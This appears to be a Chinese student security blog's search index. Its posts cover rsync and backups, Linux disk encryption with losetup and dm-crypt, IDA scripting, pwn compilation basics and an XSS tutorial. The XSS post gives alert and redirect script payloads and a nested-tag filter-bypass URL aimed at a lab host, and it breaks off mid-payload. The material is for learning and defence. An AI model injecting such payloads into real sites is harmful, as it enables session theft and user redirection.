基本服务\nrsync命令\nhttps://api.vaipixel.fxcdev.com/archives/216.html\n 下面介绍几条常用的命令\n1 2 3 4 5 6  $ rsync [OPTION]... SRC DEST $ rsync [OPTION]... SRC [USER@]host:DEST $ rsync [OPTION]... [USER@]HOST:SRC DEST $ rsync [OPTION]... [USER@]HOST::SRC DEST $ rsync [OPTION]... SRC [USER@]HOST::DEST $ rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]   其实这命令跟ssh的转发挺像的，都是固定一个地方到另一个地方\n 拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号\":\"分隔符时就启动这种工作模式。如：rsync -a /data /backup 使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号\":\"分隔符时启动该模式。如：rsync -avz *.c foo:src 使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号\":\"分隔符时启动该模式。如：rsync -avz foo:src/bar /data 从远程rsync服务器中拷贝文件到本地机。当SRC路径信息包含\"::\"分隔符时启动该模式。如：rsync -av root@192.168.78.192::www /databack 从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含\"::\"分隔符时启动该模式。如：rsync -av /databack root@192.168.78.192::www 列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://192.168.78.192/www  具体选项如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  -v, --verbose 详细模式输出。 -q, --quiet 精简输出模式。 -c, --checksum 打开校验开关，强制对文件传输进行校验。 -a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。 -r, --recursive 对子目录以递归模式处理。 -R, --relative 使用相对路径信息。 -b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。 --backup-dir 将备份文件(如~filename)存放在在目录下。 -suffix=SUFFIX 定义备份文件前缀。 -u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。 -l, --links 保留软链结。 -L, --copy-links 想对待常规文件一样处理软链结。 --copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。 --safe-links 忽略指向SRC路径目录树以外的链结。 -H, --hard-links 保留硬链结。 -p, --perms 保持文件权限。 -o, --owner 保持文件属主信息。 -g, --group 保持文件属组信息。 -D, --devices 保持设备文件信息。 -t, --times 保持文件时间信息。 -S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。 -n, --dry-run现实哪些文件将被传输。 -w, --whole-file 拷贝文件，不进行增量检测。 -x, --one-file-system 不要跨越文件系统边界。 -B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节。 -e, --rsh=command 指定使用rsh、ssh方式进行数据同步。 --rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。 -C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。 --existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。 --delete 删除那些DST中SRC没有的文件。 --delete-excluded 同样删除接收端那些被该选项指定排除的文件。 --delete-after 传输结束以后再删除。 --ignore-errors 及时出现IO错误也进行删除。 --max-delete=NUM 最多删除NUM个文件。 --partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。 --force 强制删除目录，即使不为空。 --numeric-ids 不将数字的用户和组id匹配为用户名和组名。 --timeout=time ip超时时间，单位为秒。 -I, --ignore-times 不跳过那些有同样的时间和长度的文件。 --size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。 --modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。 -T --temp-dir=DIR 在DIR中创建临时文件。 --compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。 -P 等同于 --partial。 --progress 显示备份过程。 -z, --compress 对备份的文件在传输时进行压缩处理。 --exclude=PATTERN 指定排除不需要传输的文件模式。 --include=PATTERN 指定不排除而需要传输的文件模式。 --exclude-from=FILE 排除FILE中指定模式的文件。 --include-from=FILE 不排除FILE指定模式匹配的文件。 --version 打印版本信息。 --address 绑定到特定的地址。 --config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。 --port=PORT 指定其他的rsync服务端口。 --blocking-io 对远程shell使用阻塞IO。 -stats 给出某些文件的传输状态。 --progress 在传输时现实传输过程。 --log-format=formAT 指定日志文件格式。 --password-file=FILE 从FILE中得到密码。 --bwlimit=KBPS 限制I/O带宽，KBytes per second。 -h, --help 显示帮助信息。   比较注意的是这些选项：-e、-v、-r、 -R 、-p\n-aqzrtopg\nrsync可以依靠rsync协议或者ssh协议通道来进行备份，本质上是建立起一个通道进行备份\n0x02 备份指南  Reference：\n  备份的321原则  3：存储 3 份完整文件，一份原件加上两份拷贝。 2：将文件起码保持在两种不同的介质上。 1：将一份拷贝保存在异地。    然后在做备份时，需要对备份文件的每个目录写个Readme，方便解释如何备份，如何恢复\n然后再做个总目录，就完美了\n一个备份目录示例如下（摘自参考链接中的少数派，个人正在制作相关的备份目录）：\n重装指南 ├── 目录.md ├── Google Chrome 扩展 │ ├── 如何备份.md │ ├── Proxy SwitchyOmega.bak │ └── 扩展列表.md ├── 桌面程序 │ ├── 如何备份.md │ ├── Bandizip │ │ └── Bandizip Settings.reg │ ├── Directory Opus │ │ └── Opus Config.ocb │ ├── DnsJumper │ │ └── DnsJumper.ini │ ├── Everything │ │ └── Everything.ini │ ├── Listary │ │ └── Preferences.json │ ├── Snipaste │ │ └── config.ini │ └── VSCode │ ├── 扩展列表.md │ ├── 键位绑定.json │ ├── 全局设置.json │ └── 代码片段 │ ├── c.json │ ├── ... │ └── markdown.json ├── Linux 安装指南 │ ├── CentOS.md │ ├── 软件列表.md │ └── WSL.md ├── Mac 安装指南 │ ├── 如何备份.md │ ├── brew bundle.md │ ├── 应用程序.md │ └── 手动安装.md ├── 手机应用列表 │ ├── 如何备份.md │ ├── Android.md │ └── iPhone.md ├── oh-my-zsh │ ├── 如何备份.md │ ├── zshrc-mac.md │ ├── zshrc-vps.md │ └── zshrc-wsl.md └── Windows 安装指南 ├── 如何备份.md ├── 第一次配置.md └── 软件列表.md ","description":"","tags":[],"title":"Data Backup","uri":"/posts/data-backup/"},{"categories":[],"content":"About encrypting Linux file 0x00 序 在上次做完vhdx实验后，老师又让我们做了一次有关linux的文件加密的相关实验\n但是在做实验时，都是直接照敲命令运行，到最后看到lost+found就算成功了，但是作为一个学习者我们不能酱紫\n我们这次来看看这些命令到底是做什么的\n0x01 losetup/cryptoloop 方法 创建命令如下：\n1 2 3 4 5 6 7 8 9 10  $ dd if=/dev/zero of=bigf1 bs=1024000 count=0 seek=77 $ modprobe cryptoloop des aes $ losetup -e aes /dev/loop1 bigf1 $ # fdisk /dev/loop1 $ mkfs /dev/loop1 $ mkdir d1 $ mount /dev/loop1 d1 $ cd d1 $ ls     dd ：dd命令用于创建一个大文件，用来当作虚拟磁盘，相当于windows的vhdx文件\n   Linux dd命令\n   第一条命令，if规定输入文件名，即标准输入； of规定输出文件名，即标准输出；bs用于设置读入\u0026输出的块大小，单位为 byte 字节；count 规定拷贝block个块 ；seek 规定从输出文件开头跳过blocks个块后在开始复制，对应的跳过输入文件的前n个块的选项为skip。\n  /dev/zero ：属于linux中的特殊设备，零设备，可以无限的提供空字符(0x00,ASCII码为NUL)，常用来生成一个特定大小的文件\n  所以这条命令意于创建一个大小为1G的全为0的大文件\n    类似的创建大文件命令有： fallocate 、 truncate\nfallocate：功能是为文件预分配物理空间，而不是生成一个空洞文件，fallocate分配的空间在磁盘的扇区上是连续的，它减少后续写入和读取文件时的磁盘寻道开销；并且是迅速直接占用空间，而不是想空洞文件那样“假装”占有那么多空间，这样就可以保证随着磁盘空间的使用，而不会出现该段磁盘空间不足。由于fallocate并不是标准的posix接口，并不是所有的文件系统都是支持的，目前主流的ext4和xfs都是可以的。\ntruncate是将文件的末尾位置“扩展到”一个固定位置而生成的一个空洞文件，也即是稀疏文件。该文件并不占用实际磁盘空间，只是逻辑上看起来那么大而已。\n  modprobe ：这个命令在之前学习内核编程时有接触过，用来自动加载模块及其依赖，相当于apt install 自动装包，这个就是自动加载模块进内核\n 这边用于加载后面所用的加密模块    losetup 命令：关键之处来了，该命令用于设置循环设备。循环设备可把文件虚拟成区块设备，籍以模拟整个文件系统，让用户得以将其视为硬盘驱动器，光驱或软驱等设备，并挂入当作目录来使用。\n  1  $ losetup [-d][-e \u003c加密方式\u003e][-o \u003c平移数目\u003e][循环设备代号][文件]     Linux losetup命令\n  这边是将big1大文件虚拟成块设备/dev/loop1，然后以aes的方法加密\n  /dev/loop ：loop设备是一种伪设备，是使用文件来模拟块设备的一种技术，文件模拟成块设备后, 就像一个磁盘或光盘一样使用。在使用之前，一个 loop 设备必须要和一个文件进行连接。这种结合方式给用户提供了一个替代块特殊文件的接口。因此，如果这个文件包含有一个完整的文件系统，那么这个文件就可以像一个磁盘设备一样被 mount 起来。之所以叫loop设备（回环），其实是从文件系统这一层来考虑的，因为这种被 mount 起来的镜像文件它本身也包含有文件系统，通过loop设备把它mount起来，它就像是文件系统之上再绕了一圈的文件系统，所以称为 loop。\n wiki - Loop设备 卸载一个loop设备：losetup -d /dev/loop1 losetup -a查看所有的loop设备，如果命令没有输出就说明所有的loop设备都没有被占用 创建loop设备的命令mknod -m 0660 /dev/loopX b 7 X：假如loop设备全满，可以通过这个建一个新的，又或者手贱删了(比如我)，用这个也能创建回来      mkfs命令用于在特定的分区上建立 linux 文件系统\n Linux mkfs命令 既然我们都把大文将big1当一个虚拟磁盘一样和loop设备关联在一起，那么现在就是来制作虚拟磁盘的时候，这个命令在big1上建立linux文件系统    mkdir d1;mount /dev/loop1 d1;cd d1 ： 这几个命令一起讲了，就是创建个文件夹d1，可以供刚才的虚拟磁盘挂载，类似于插入u盘然后挂载到本地一样\n Linux mount命令    卸载虚拟磁盘，这个也是非常简单，按着上面的步骤逆着回去就行了\n1 2 3 4 5  $ umount /dev/loop1 $ losetup -d /dev/loop1 $ rmmod cryptoloop des aes $ # rm -rf big1 d1 $   0x02 luks:cryptsetup/dm-crypt方法 创建的命令如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  $ apt install cryptsetup-bin $ modprobe aes # or des，twofish etc $ modprobe dm-crypt $ lsmod | grep -E \"aes|dm\" $ ls /dev/mapper/control $ dmsetup targets # 查看targets信息 $ dd if=/dev/zero of=bf1 bs=1024000 count=500 conv=fdatasync $ losetup /dev/loop1 bf1 $ cryptsetup -c aes create efs1 /dev/loop1 $ dmsetup ls $ ls /dev/mapper/efs1 $ mkfs /dev/mapper/efs1 $ mkdir efs1 $ mount /dev/mapper/efs1 ./efs1 $ cd ./efs1 $ dd if=/dev/zero of=t1 bs=1024000 count=100 conv=fdatasync $ $ cd .. $ hexdump -C -x ./efs1 # 看到乱码   首先来了解一下 cryptsetup-bin ，这个包提供了一个接口，该接口使用Linux内核设备映射器对象 dm-crypt 去加密块设备，支持Linux统一密钥设置（LUKS）的功能。\n dm-crypt: a device-mapper crypto target\nDMCrypt  ： wiki\nGitLab - Cryptsetup ：项目官网\nLinux块设备加密之dm-crypt分析 ：一些源码分析\ndm-crypt——多功能 Linux 磁盘加密工具 ：使用方法介绍\n使用cryptsetup创建加密磁盘\n dm-crypt ：自从Linux Kernel 2.6 的早期版本，被整合到内核中\n支持以下集中加密格式\n LUKS：dm-crypt 最常用的一个模式 Plain：原始的dm-crypt格式 Loop-AES ：比较陈旧的Linux磁盘加密工具 TCRYPT：TrueCrypt的缩写，这个老师上课介绍过，也是一个加密工具     可以通过 uname -a：可以查看内核版本\n  然后从这里（Linux 官网）下载对应版本的linux源码\n  在kernel_path/drivers/md/dm-crypt.c拿出源码\n  然后参考这个目录下的Makefile，当然也可以通用的用内核编译的Makefile，比如我的博客里的这里面的Makefile，稍加修改就可以编译得到.ko的内核模块执行文件\nP.S. 也可以去编译整个内核源码，然后在对应文件夹找到对应的.ko文件，进行内核模块加载\n     /dev/mapper/control\n Linux 内核中的 Device Mapper 机制 Linux系统/dev/mapper目录浅谈 Linux 内核中的 Device Mapper 机制 ：IBM的内核机制讲解    dmsetup 命令：该命令用于查看Device Mapper相关的设备概述，若无指定设备名称，则输出所有的Device Mapper设备信息\n   DMSETUP 命令\n     这一些列命令的操作大多和第一种方法相似，只是换了一种工具罢了\n卸载的命令如下\n1 2 3 4 5 6 7  $ cd .. $ umount /dev/mapper/efs1 $ cryptsetup remove efs1 $ dmsetup ls # now nothing left $ losetup -d /dev/loop1 $ rmmod dm-crypt   ","description":"About Linux security storage","tags":[],"title":"Security Storage","uri":"/posts/security-storage/"},{"categories":null,"content":"For Some userful link 原本想要做一个类似于导航页面的网站，但是看了许多项目，都不能让我满意\n故先暂时将链接存此\n Common 黑客精神：http://catb.org/~esr/faqs/hacker-howto.html\n  GitHub    Linux source code: By Bootlin :项目地址    IconFont: 阿里巴巴矢量图库    安全圈info:信息安全导航    Paper    看雪论坛    Sec-Wiki    先知社区    安全客    FreeBuf    知道创宇-博客    吾爱破解    Wooyun Mirror :Mirror Code \u0026 http://wy.zone.ci/    Blog of BUUCTF's dalao's : some blog    中国科学技术大学 Linux 用户协会    Segment Fault  https://navisec.it/\nhttps://bingoyyy.gitee.io/website-navigation/\nhttp://skills.bugbank.cn/\nhttps://www.ddosi.com/\nhttps://www.ctftools.com/down/\n https://www.hackerone.com/\n fmyy.pro\npwnki\n0xpat\nhttps://veteransec.com/\nhttps://www.offensive-security.com/\n Links To Everything    国内安全团队   国外安全团队   高校安全研究实验室   ","description":"","tags":null,"title":"Link","uri":"/link/"},{"categories":["reverse"],"content":"IDA 脚本入门 总所皆知，IDA是一个非常好用的逆向静态分析工具，上节课，老师带我们体验到了ida脚本的魅力，我们这次就来了解一波IDA的脚本\n Reference:\nIDA Pro 脚本系统(idc idaPython)帮助文档索引\n2018-07-14 IDA-脚本编写\nidc\nIDA Help: Alphabetical list of IDC functions\n[翻译][原创]IDC脚本 - IDC脚本语言官方教程\nIDA-IDC脚本编写语法\nIDA Python\nIDAPython初学者指南：本地版本[here](./IDA-Script-Programming/IDAPython 初学者指南.pdf)\nIDAPython Docs：hex-rays官方文档\nIDA-python学习小结\nIDAPYTHON --- IDA 脚本\n​\tIDAPython 函数\nIDApython插件编写及脚本批量分析教程\n 我解到了IDA脚本主要有IDA python 和 IDC\nIDC脚本语言是一种类似C的脚本语言，和C语言有着类似的语言标记。然而，由于IDC是一种脚本语言，就无法包含指针这样的高级特性了，但是所有的变量类型，脚本解释器都是可以支持的。IDC中的变量是弱类型的，一个变量可以保存任何类型的数据，因此变量声明的时候是不需要指定变量类型的，比如你可以这样进行变量声明： auto myvar;\nIDA python 为IDA中集成的python解释器（美中不足的就是目前是python2.7版本），能够调用所有的idc的函数以及所有python脚本，他可以充分利用python的数据处理能力和所有python模块\n脚本的用处很多，以现在的我的了解来说，ida脚本最多的用处是用来脱壳和寻找pwn的易被攻击的函数\n使用  shift + F2 会弹出一个对话框，可以将脚本直接写在里面，点run运行，即File -\u003e Script Command 菜单栏中 File -\u003e Script file载入idc文件，同样，alt + F7  输出在下面的Output Window里\nIDC IDC脚本语言借用了很多C语言的语法，因此我们很快就能上手\n  IDC变量   auto： IDC关键字auto用于引入一个局部变量，如auto var,addr;\n IDC认可使用/* */的c语言风格进行多行注释。 也使用//的C++风格进行行尾注释 使用;作为终止符（和c语言中一样） IDC并不支持c风格数组类型，指针,结构体,联合之类，复杂的数据类型  extern：IDA使用extern关键字引入全局变量申明\n  表达式   IDC支持c中的所有表达式和逻辑运算符，包括三元运算符（？：）。\n支持逗号运算符，但是 不支持 op=(+=,*=,\u003e\u003e=等)复合赋值运算符。\n不支持算术移位，如果要移位只能修改最高位和最低位。如下所示：\n提供分片运算，使用方括号和其实索引（包括）与结束索引（不包括）来指定至少一个索引。这个就像python数组一样，比如s1 = str[7:9]、s2 = str[:6]、s3 = str[10:]\n  IDC语句   语句以分号结尾，但是不支持复合语句。\n引入try/catch块和相关的throw语句，相当与C++的异常处理。\n使用和C语言一样的花括号和语义。在花括号中可以申明变量，申明变量必须位于花括号内的第一条语句。\nMessage类似于c语言中的print\n  IDC函数    .idc文件支持用户定义的函数。 IDC命令对话框不支持用户定义的函数。 使用static声明用户定义的函数。 函数的参数列表以逗号隔开。    若需要返回值 ，使用return\n 可以将函数的引用作为参数传递给另外一个函数，并将函数引用的作为函数的结果返回。    main()函数依旧为函数入口\n  IDC程序    当执行大量的IDC语句的时候，需要创建一个独立的IDC程序文件。 IDC程序文件，至少定义一个没有参数的main函数。 IDC文件必须包含**#include\u003cidc.idc\u003e **这个文件，由此获得宏定义。  拿老师给的示例程序来说\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  #include \u003cidc.idc\u003e /* //part1:helloworld static main(){ //Wait(); Message(\"Hello world\"); //Exit(0); return 0; } */ //part2:see segment  static list_segs() {\tauto ea, i=0; ea = FirstSeg(); while (ea != BADADDR) {\tMessage(\"\\nsegment %d 0x%08X-0x%08X\\n\", i, ea, SegEnd(ea)); list_func_with_ref(ea); ea = NextSeg(ea); i++; }\t} /* static main() {\t//Wait(); list_segs(); //func_list_ref();\tMessage(\"\\n\\n bye \\n\\n\");\t//Exit(0); } */ //part3:see function  static list_func_with_ref(ea) { auto func; func = SegStart(ea); //Message(\"first addr is %x\\n\", func); // note: first address maybe not a func  while (func != BADADDR \u0026\u0026 func \u003c SegEnd(ea)) { if (GetFunctionFlags(func) != -1) // if really a func  { auto ref, tip; if (func\u003e=SegStart(ea) \u0026\u0026 func\u003cSegEnd(ea)) tip = \"Internal\"; else tip = \"External\"; Message(\"%s Function 0x%08X %s\\n\", tip, func, GetFunctionName(func)); for (ref=RfirstB(func); ref != BADADDR; ref=RnextB(func, ref)) { auto caller_name, caller_addr; caller_name = GetFunctionName(ref); caller_addr = GetFunctionAttr(ref, FUNCATTR_START); Message(\" called at 0x%08X by 0x%08X(%s)\\n\", ref, caller_addr, caller_name); } } func=NextFunction(func); } } static main() {\tMessage(\"Hello!\"); //Wait(); \tlist_segs(); auto ea; //ea = FirstSeg(); \t//list_func_with_ref(ea);\t\tMessage(\"\\n\\nbye \\n\\n\");\t//Exit(0); }   首先在头部引入#include \u003cidc.idc\u003e，这个是必须的，包含了idc里面的宏定义\nFirstSeg()获取第一个Segment段的地址，然后调用list_ref_function展示其中的函数，将此过程进行循环每一个segment\nlist_ref_function：通过GetFunctionFlags来判断是否是一个地址是否有函数开始标志，来获取函数的地址和名字，并用Message函数打印出来\nIDA Python IDA Python 由三个分离的模块组成,他们分别是 idc,idautils 和 idaapi。\nidc:这是兼容idc函数的模块 idautils:很使用的一个模块，大多数处理都是需要依托于这个模块 idaapi:允许使用者通过类的形式，访问更多底层的数据 IDA Python 的强大之处在于它能遍历所有的指令,所有的交叉引用地址,还有搜索所有的代码和数据。\n一些功能  指令处理\n  获取当前指令地址：ea=here() print “0x%x %s”%(ea,ea) 获取当前的汇编指令：idc.GetDisasm(ea) 获取当前处于的段：idc.SegName() 获取该段程序最低和最高地址：hex(MinEA()) hex(MaxEA()) 获取下(上)一条汇编指令地址：ea = here() ; next_instr = idc.NextHead(ea) PrevHead(ea)   函数操作\n   获取程序所有函数的名称：\nfor func in idautils.Functions(): print hex(func), idc.GetFunctionName(func)   计算当前函数有多少条指令\nea = here() len(list(idautils.FuncItems(ea)))   获取当前IDB中记录的所有有名字函数的地址和名称： idautils.Names() 返回的是一个以元组组成的列表，函数的起始地址指向了其plt表   指令操作\n  给定地址，打印指令 idc.GetDisasm(ea) 给定函数中一个地址，得到整个函数的指令列表 idautils.FuncItems(here()) 获取函数的一些flag信息： idc.GetFunctionFlags(func) 对一条汇编指令进行拆解： 获取指令的操作：idc.GetMnem(here()) 获取指令的操作数：idc.GetOpType(ea,n) 根据返回的数值，可以判断操作数类型（普通寄存器、常量字符串等） 对汇编指令中用到的操作数，求取其引用的地址，也就是双击该操作数后跳转到的地址 hex(idc.GetOperandValue(here(),1))   交叉引用\n  指令从哪个地方来：idautils.CodeRefsTo(here(),0) 指令下一步去到哪儿：idautils.CodeRefsFrom(here(),0) 数据从哪个地方来：idautils.DataRefsTo(here(),0) 数据下一步去到哪儿：idautils.DataRefsFrom(here(),0) 较为通用的一种获取xref：idautils.XrefsTo(here(),flag) 其中flag=0时，所有的交叉引用都会被显示  ","description":"About IDA Script","tags":["reverse","IDA"],"title":"IDA-Script","uri":"/posts/ida-script/"},{"categories":["pwn"],"content":"Pwn  参考：\nhttps://mp.weixin.qq.com/s/JovqFitTQj4M37su_lH--g\nPwn学习\n漏洞平台 https://bbs.h-acker.net/?p=69\nhttps://www.jarvisoj.com/\nabout plt \u0026 got: https://blog.csdn.net/linyt/article/details/51635768\n 0x00 序 关于Pwn的前置技能\n从C语言到可执行程序 我们一般编译，直接gcc -o test test.c就编译出可执行程序可以直接跑了\n不过编译并没有表面上一条命令这么简单，通过上学期的编译原理我们可以知道，编译要经过词法分析、语法分析、语义分析等等，经过编译器的前端生成未经优化过的中间代码，然后再由后端优化生成可执行程序的汇编代码，再进一步转成可执行的二进制代码（机器码）\n如上图，为gcc编译的过程：编译，汇编，链接\n 其实还少了一部分——预编译：p1.c，p2.c经过预编译gcc -E p1.c p2.c生成p1.i，p2.i\n此阶段主要完成#符号后面的各项内容到源文件的替换，例如头文件#include和宏定义#define, #ifdef等。 可以用gcc的参数-E来指示编译器只做预处理而不进行下面的编译、汇编、链接三个动作\n编译：gcc -S p1.i p2.i -o p1.s p2.s\n  .S ：预处理，编译\n  .s：编译\n     编译：把源程序处理成汇编代码\n  gcc -S p1.c -o p1.s\n   词法分析\n语法分析\n中间代码生成与优化\n目标代码生成与优化\n     汇编：将汇编代码处理成字节码，即汇编命令的01串翻译\n  gcc -C p1.s -o p1.o\n   语法分析\n助记符转为操作码\n立即数、标号、地址转为操作数\n生成目标文件\n   gcc或as或nasm汇编器都可以实现\n    我们一般阅读的都是十六进制表示（比如所说的74/75破解）\n  链接：将多个目标文件或库文件链接成可执行程序\n  gcc p1.o -o p1\n   将多个目标文件、库文件中的代码、数据的信息合并\n修复文件之间的引用关系：核心作用\n生成可执行程序\n静态库中的代码和数据会完整拷贝到可执行程序，而动态库则需要再程序运行时通过动态链接的方式加载\n  库文件：可复用的代码集合，以供使用者调用\n 静态库：.a 动态库：.so、.dll：节约文件内存、操作系统的运行时的内存         如上图，链接将sum.o、main.o、libprint.a三个目标代码整合至可执行程序a.out里\n这就是链接的过程\n机器指令如何执行 ","description":"Something about pwn!","tags":["ctf","pwn","security"],"title":"pwn-learning","uri":"/posts/pwn-learning/"},{"categories":["web"],"content":"XSS 跨站脚本攻击 上节课，老师讲了有关XSS的攻击，我们便在这复习一波\n 主要参考：\n老师的ppt以及ctf-wiki\nGoogle Security - XSS\nctf-wiki : XSS Cross-site Scripting Attack\n跨站脚本漏洞(XSS)基础讲解\n前端安全系列（一）：如何防止XSS攻击？\n浅谈XSS攻击的那些事（附常用绕过姿势）\n 然后这边有一个在线的xss靶场：the XSS game\nXSS简介 什么是XSS：跨站脚本攻击，Cross-Site Scripting，为了和CSS(层叠样式表)区分开来，把第一个字母C改成了X，也就是现在所说的XSS攻击\n跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。\nXSS分类 XSS主要分为3种，分别是反射性XSS、持久性XSS(存储型XSS)、DOM XSS\n  反射性XSS   最经典的反射性XSS，就是我们在一个对话框里输入\u003cscript\u003ealert('Hello, XSS!')\u003c/script\u003e\n然后跳出一个向你打招呼的XSS对话框\n反射型 XSS 的攻击步骤：\n 攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。  反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。\n由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。\n如图，攻击者给出一个诱使你点进去的超链接（包含脚本）(1)，用户点进去该网站(2\u00263)，服务器将该请求返回给用户，返回的页面形成victim's browser里的内容，然后执行了脚本，将自身的cookie发送给攻击者\n  存储型XSS   存储型 XSS 的攻击步骤：\n 攻击者将恶意代码提交到目标网站的数据库中。 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。  这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、评论区、用户私信等。\n如图，很简单的在一个评论区里，攻击者在评论区进行评论了一个脚本(1)，此时，服务器将这个脚本存储下来，并作为评论展示给每个用户。当其他用户浏览评论时(2\u00263)，服务器将脚本返回给用户，用户加载给页面，即评论区的脚本时，将自身的cookie以get方式发给攻击者的网站(4)，此时攻击者就获得了用户的cookie\n  反射型 XSS 和存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。\n  DOM 型 XSS   DOM 型 XSS 的攻击步骤：\n 攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL。 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。  DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。\nXSS的危害 其实归根结底，XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码。\n可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上alert（“say something”）的。\n在真正的应用中，XSS攻击可以干的事情还有很多，这里举两个例子。\n  窃取网页浏览中的cookie值   在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。\n如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到document.cookie。\n试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过某些厂商的cookie有其他验证措施如：Http-Only保证同一cookie不能被滥用）\n  劫持流量实现恶意跳转   这个很简单，就是在网页中想办法插入一句像这样的语句：\n1  \u003cscript\u003ewindow.location.href=\"http://www.baidu.com\";\u003c/script\u003e   那么所访问的网站就会被跳转到百度的首页。\n早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。\nXSS漏洞防范  过滤 服务器对输入内容进行过滤，对一些常用的标签(\u003cscript\u003e、\u003cimg\u003e、\u003ca\u003e)进行过滤，也有可能需要多次过滤以防绕过 输入输出编码 服务器对输入内容的一些常见符号进行编码，使得浏览器不会对标签进行解释执行 对内容长度进行限制 对于注入内容一般比较长的进行长度限制，因为达成XSS攻击一般需要较长的字符串，比如输入名字的时候，我们没必要开过长的数组  作为用户，我们需要小心点击来源不明的URL，对浏览器进行安全加固，虽然大多差错是来源于服务器端的检查过滤不足导致的，但后果却是导致我们的信息丢失，因此作为用户我们也应当加以防范。\nXSS防范与绕过 安全总是在对抗中产生的，假如没有攻击，那么哪来的防范提升呢？正如老话：魔高一尺，道高一丈。只有在不断地攻击中，安全才能更胜一步。\n既然XSS被发现，就会有人对他进行防范，既然有了防范，那么就会有人去想方设法的去绕过他\n这里介绍一些经典的绕过方式\n 大小写绕过 利用过滤后返回语句在此构成攻击语句来绕过（简称套娃） 比如：http://192.168.1.102/xss/example3.php?name=\u003csCri\u003cscript\u003ept\u003ealert(\"hey!\")\u003c/scRi\u003c/script\u003ept\u003e 并不是只有script标签才可以插入代码，比如\u003ca\u003e、\u003cimg\u003e、\u003cdiv\u003e等等 编码脚本代码绕过关键字过滤 主动闭合标签实现注入代码 组合各种方式：就如同sql注入一样，XSS需要用心去构造0.0  XSS靶场通关构造  https://blog.csdn.net/abc_12366/article/details/82054946\n 1\n输入框搞事情了\n\u003cscript\u003ealert('hello,XSS!')\u003c/script\u003e\n2\n评论区搞事情了\n\u003cimg src=\"nowhere\" 